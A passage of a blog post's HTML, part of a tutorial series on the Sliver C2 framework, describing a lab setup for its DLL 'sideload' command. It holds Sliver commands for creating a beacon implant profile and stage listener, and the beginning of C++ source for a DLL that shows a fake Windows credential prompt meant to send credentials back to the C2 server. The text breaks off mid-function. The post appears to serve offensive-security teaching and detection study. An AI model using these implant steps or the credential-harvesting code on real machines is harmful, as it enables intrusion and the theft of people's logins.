@@ -1,0 +1,1980 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="generator" content="Hugo 0.92.2" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Learning Sliver C2 (10) - Sideload | text/plain</title>
+    <meta name="description" content="Deep-dive into the sideload command Sliver provides for execution of native shared libraries, including Windows DLLs.
+I show how to use the command but also how it works under the hood.
+We cover both Sliver itself as well as Donut, which Sliver depends on.
+On top there are some brief notes on detection.
+">
+    <meta name="keywords" content="c2, sliver, tutorial, implant, sideload, donut, DLL, PE">
+    
+    
+    
+    
+    
+
+  <meta name="author" content="Dominic Breuker">
+
+
+    <meta property="og:title" content="Learning Sliver C2 (10) - Sideload" />
+<meta property="og:description" content="Deep-dive into the sideload command Sliver provides for execution of native shared libraries, including Windows DLLs.
+I show how to use the command but also how it works under the hood.
+We cover both Sliver itself as well as Donut, which Sliver depends on.
+On top there are some brief notes on detection.
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dominicbreuker.com/post/learning_sliver_c2_10_sideload/" /><meta property="og:image" content="https://dominicbreuker.com/img/avatar.png"/><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2023-02-04T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-02-04T00:00:00+00:00" />
+
+
+    
+
+
+
+  <meta property="og:image" content="img/avatar.png">
+
+
+    <meta name="theme-color" content="#000">
+
+    
+    
+    
+    
+    <link rel="canonical" href="https://dominicbreuker.com/post/learning_sliver_c2_10_sideload/">
+    
+    
+    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
+
+    <style>
+  html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;-ms-grid-row-align:flex-start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;-ms-grid-row-align:flex-end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;-ms-grid-row-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:''}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:'';border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:'';width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:'&nbsp;';height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}
+  :root {
+  --screen-size-small: 30em; /* breakpoint reference only */
+}
+@keyframes intro {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+.muted {
+  color: rgba(255, 255, 255, 0.5);
+}
+.readmore {
+  margin-bottom: 2.2em;
+}
+.responsive-iframe {
+  position: relative;
+  padding-bottom: 56.25%; /* 16:9 */
+  padding-top: 25px;
+  height: 0;
+}
+.responsive-iframe iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+iframe {
+  border: 0;
+}
+main, footer {
+  animation: intro 0.3s both;
+  animation-delay: 0.15s;
+}
+footer time[datetime$="M"]:before {
+  content: "\2013\0020";
+}
+@media only screen
+  and ( max-width: 30em ) {
+  footer time[datetime$="M"] {
+    display: none;
+  }
+}
+blockquote cite {
+  display: block;
+}
+blockquote cite::before {
+   content: "\2014";
+}
+:target {
+  color: #fff;
+}
+/* hack.css overrides and enhancements */
+.hack li ul {
+  margin: 0;
+}
+.main {
+  padding: 20px 10px;
+}
+nav a.active {
+  background-color: #ff2e88;
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #ff9800;
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+}
+a[href*="://"]::after,
+a[rel*="external"] {
+  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
+}
+figure a[href*="://"]::after,
+figure a[rel*="external"] {
+  content: "";
+}
+html {
+  font-size: 13px;
+}
+.hack pre {
+  font-size: 17px;
+}
+article [itemprop="description"] {
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+@media screen and (min-width: 768px) {
+  html {
+    font-size: 1em;
+  }
+  .container {
+    max-width: 50rem;
+  }
+}
+
+  nav a.active {
+  background-color: #33cc33; /*ff2e88*/
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #339933; /*ff9800*/
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+.dark pre code {
+  color: #248f24;
+}
+
+.dark code {
+  color: #248f24;
+}
+
+a {
+  color: #339933; /*ff9800*/
+  border-bottom: 1px solid #33cc33;
+}
+
+a:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+/* custom styles */
+figure {
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+figure img {
+  max-width: 100%;
+}
+figure a {
+  border-bottom: none !important;
+}
+figure a:hover {
+  background-color: inherit !important;
+}
+
+input:invalid {
+  border-bottom: 2px solid #f44336 !important;
+}
+
+input:valid {
+  border-bottom: 2px solid #ccc;
+}
+
+</style>
+
+    
+    
+      <script async src="/js/lazysizes.min.js"></script>
+    
+    
+      <script async src="/js/bpgdec8a.js"></script>
+      <script async src="/js/bpgdec8.js"></script>
+      <script async src="/js/bpgdec.js"></script>
+    
+  </head>
+  
+  <body class="hack dark main container">
+    <header>
+  
+  <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+    
+    
+      <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
+    
+      <a itemprop="url" class="" href="/post/"><span itemprop="name">Post</span></a>
+    
+      <a itemprop="url" class="" href="/encoders/"><span itemprop="name">Encoders</span></a>
+    
+      <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
+    
+  </nav>
+
+
+</header>
+    <main>
+  <article itemscope itemtype="http://schema.org/BlogPosting">
+    <meta itemprop="name" content="Learning Sliver C2 (10) - Sideload">
+<meta itemprop="description" content="Deep-dive into the sideload command Sliver provides for execution of native shared libraries, including Windows DLLs.
+I show how to use the command but also how it works under the hood.
+We cover both Sliver itself as well as Donut, which Sliver depends on.
+On top there are some brief notes on detection.
+"><meta itemprop="datePublished" content="2023-02-04T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2023-02-04T00:00:00+00:00" />
+<meta itemprop="wordCount" content="7170"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
+<meta itemprop="keywords" content="c2,sliver,tutorial,implant,sideload,donut,DLL,PE," />
+    <script async src="/js/baffle.js"></script>
+    <header>
+      <h1 class="baffle" itemprop="headline">Learning Sliver C2 (10) - Sideload</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>34 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2023-02-04T00:00:00&#43;00:00">4 Feb, 2023</time>
+
+
+      </p>
+    </header>
+    
+      <blockquote itemprop="description">Deep-dive into the sideload command Sliver provides for execution of native shared libraries, including Windows DLLs.
+I show how to use the command but also how it works under the hood.
+We cover both Sliver itself as well as Donut, which Sliver depends on.
+On top there are some brief notes on detection.
+</blockquote>
+    
+    
+  <details>
+    <summary>Table of Contents</summary>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#preparations">Preparations</a></li>
+    <li><a href="#sideload">Sideload</a>
+      <ul>
+        <li><a href="#basic-usage-demonstration">Basic usage demonstration</a></li>
+        <li><a href="#customization">Customization</a></li>
+      </ul>
+    </li>
+    <li><a href="#implementation-details">Implementation details</a>
+      <ul>
+        <li><a href="#sliver-source-code">Sliver source code</a></li>
+        <li><a href="#inside-donut">Inside Donut</a></li>
+      </ul>
+    </li>
+    <li><a href="#detection">Detection</a></li>
+  </ul>
+</nav>
+  </details>
+  <script>
+    const el = document.querySelector('details summary')
+    el.onclick = () => {
+      (function(l,o,a,d,e,r){e=o.createElement(a),r=o.getElementsByTagName(a)[0];e.async=1;e.src=d;r.parentNode.insertBefore(e,r)})(window,document,'script','/js/smoothscroll.js');
+      el.onclick = null
+    }
+    document.querySelectorAll('#TableOfContents a').forEach(link => {
+      link.addEventListener('click', () => {
+        document.querySelector(
+          link.href.slice(link.href.indexOf('#'))
+        ).scrollIntoView({ behavior: 'smooth' })
+      })
+    })
+  </script>
+
+
+    <div itemprop="articleBody">
+      <h1 id="sliver-c2">Sliver C2</h1>
+<p>This post is part of a tutorial blog post series on Sliver C2 (used here in version v1.5.30).
+For an overview: <a href="../../post/learning_sliver_c2_01_installation/">click here</a>.</p>
+<h2 id="introduction">Introduction</h2>
+<p>The previous <a href="../../post/learning_sliver_c2_09_execute_assembly/">post 9</a> was about
+making a Windows implant run 3rd party tools. One limitation was that <code>execute-assembly</code>,
+the command we used, could only run tools written in .NET. In this post we therefore
+learn about the <code>sideload</code> command. It supports execution of native DLLs in
+Portable Executable (PE) format.</p>
+<p>Readers of the post about <code>execute-assembly</code> will notice considerable similarities with this one.
+Both <code>execute-assembly</code> and <code>sideload</code> basically use <a href="https://github.com/TheWover/donut">Donut</a>
+to turn the payload into shellcode and then inject that into a process on the target machine.
+One difference is that <code>sideload</code> will always spawn a new, sacrificial process into which it injects.
+It cannot use the implant process.</p>
+<p>Some differences will appear once we look under the hood to see how Donut does its magic.
+Creating a process from a PE file is easy if the file is on disk since Windows is obviously made for that.
+Creating one from a PE file in memory is not supported though.
+Donut solves this by implementing its own PE loader which recreates the Windows loader functionality
+(or at least the most important parts of it).</p>
+<p>Here is what you can expect from this post.
+First we&rsquo;ll create a sample DLL that opens a password dialog box and sends credentials back to Sliver.
+We will then see how <code>sideload</code> can be used to run it on a target and what options exist to customize execution.
+I&rsquo;ll follow up with a short review of Sliver source code before we go in depth into the PE-specific parts of Donut.
+Finally I&rsquo;ll briefly show what Sysmon records when you sideload a DLL.</p>
+<p>I created a small lab for myself where I try out all these things.
+You may want one for yourself to follow along.
+Thus I start with a brief description of it so that you have an idea of the environment.</p>
+<h2 id="preparations">Preparations</h2>
+<p>My lab environment has the following hosts:</p>
+<ul>
+<li>a target running Windows which we want to infect (192.168.122.32)
+and which also serves as a Windows development machine (Visual Studio installed),</li>
+<li>a Sliver C2 server generating implant shellcode and running stage listeners (192.168.122.111 / sliver.labnet.local)</li>
+<li>a proxy server running Squid and a DNS service to resolve domain names in the lab (192.168.122.185)</li>
+</ul>
+<p>Posts
+<a href="../../post/learning_sliver_c2_01_installation/">1</a> to
+<a href="../../post/learning_sliver_c2_05_transports_in_detail_dns/">5</a>
+show how I created it. Details matter only if you want to replicate the setup.</p>
+<p>All you need for this post is a Windows target running a Sliver beacon implant which connects to your C2 server.
+If you don&rsquo;t know how to do that read <a href="../../post/learning_sliver_c2_06_stagers_process_injection">post 7</a>.</p>
+<p>To prepare, connect to the Sliver console and set up a stage listener.
+Create an implant profile with
+<code>profiles new beacon --http sliver.labnet.local?driver=wininet --seconds 5 --jitter 0 --skip-symbols --format shellcode --arch amd64 win64http</code>,
+then start the listener:</p>
+<pre tabindex="0"><code>sliver &gt; stage-listener --url http://sliver.labnet.local:80 --profile win64http
+
+[*] No builds found for profile win64http, generating a new one
+[*] Job 1 (http) started
+
+sliver &gt;  jobs
+
+ ID   Name   Protocol   Port 
+==== ====== ========== ======
+ 1    http   tcp        80
+</code></pre><p>Then run a stager or get the implant running in any other way.
+My stager injects into <code>msedge.exe</code>, the Edge browser.
+You should now have an active beacon.</p>
+<h2 id="sideload">Sideload</h2>
+<h3 id="basic-usage-demonstration">Basic usage demonstration</h3>
+<p>To use <code>sideload</code> you first need the PE file you want to execute on the target.
+In the <a href="../../post/learning_sliver_c2_09_execute_assembly/">previous post on execute-assembly</a>
+I&rsquo;ve used the 3rd part .NET tool Seatbelt as an example.
+This time though I use a small custom DLL to keep things simple.
+When executed, it opens up a dialog box that asks the user of the target machine for credentials.
+It reports back to Sliver whatever the user entered and also tells the operator if credentials were correct
+(as determined by <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonuserw">LogonUserW</a>
+which tries to log in to the local machine).
+The DLL is almost the same as <a href="https://github.com/hlldz/pickl3/">github.com/hlldz/pickl3</a>,
+but modified so that we get the credentials over to the C2 server.</p>
+<p>To create the DLL, create a Visual Studio 2022 project from the template &ldquo;Dynamic-Link Library (DLL)&rdquo; first.
+Make sure its for C++ Windows libraries.
+I called it &ldquo;PasswordPrompt&rdquo; but the name does not matter.
+Put the following code into Visual Studio:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pch.h&#34;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;commctrl.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;wincred.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;errno.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#pragma comment(lib, &#34;comctl32.lib&#34;)
+</span><span style="color:#75715e">#pragma comment(lib, &#34;Credui.lib&#34;)
+</span><span style="color:#75715e"></span>
+BOOL APIENTRY <span style="color:#a6e22e">DllMain</span>(HMODULE hModule,
+	DWORD  ul_reason_for_call,
+	LPVOID lpReserved
+)
+{
+	<span style="color:#66d9ef">switch</span> (ul_reason_for_call)
+	{
+	<span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH:
+	<span style="color:#66d9ef">case</span> DLL_THREAD_ATTACH:
+	<span style="color:#66d9ef">case</span> DLL_THREAD_DETACH:
+	<span style="color:#66d9ef">case</span> DLL_PROCESS_DETACH:
+		<span style="color:#66d9ef">break</span>;
+	}
+	<span style="color:#66d9ef">return</span> TRUE;
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">askForCreds</span>(DWORD maxTries) {
+
+	BOOL loginStatus <span style="color:#f92672">=</span> FALSE;
+	DWORD numTries <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+	<span style="color:#66d9ef">while</span> ((loginStatus <span style="color:#f92672">==</span> FALSE) <span style="color:#f92672">&amp;&amp;</span> (numTries <span style="color:#f92672">&lt;</span> maxTries)) {
+		numTries <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+
+		CREDUI_INFOW uiInfo <span style="color:#f92672">=</span> {};
+		uiInfo.cbSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(uiInfo);
+		uiInfo.hwndParent <span style="color:#f92672">=</span> <span style="color:#66d9ef">nullptr</span>;
+		uiInfo.pszCaptionText <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Enter Windows Credentials&#34;</span>;
+		uiInfo.pszMessageText <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Enter your credentials to proceed:&#34;</span>; <span style="color:#75715e">// optional
+</span><span style="color:#75715e"></span>		uiInfo.hbmBanner <span style="color:#f92672">=</span> <span style="color:#66d9ef">nullptr</span>;
+
+		ULONG authPackage <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+		LPVOID authBuffer <span style="color:#f92672">=</span> <span style="color:#66d9ef">nullptr</span>;
+		ULONG ulAuthBufferSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+		BOOL fSave <span style="color:#f92672">=</span> false;
+		DWORD dwAuthError <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+		dwAuthError <span style="color:#f92672">=</span> CredUIPromptForWindowsCredentialsW(
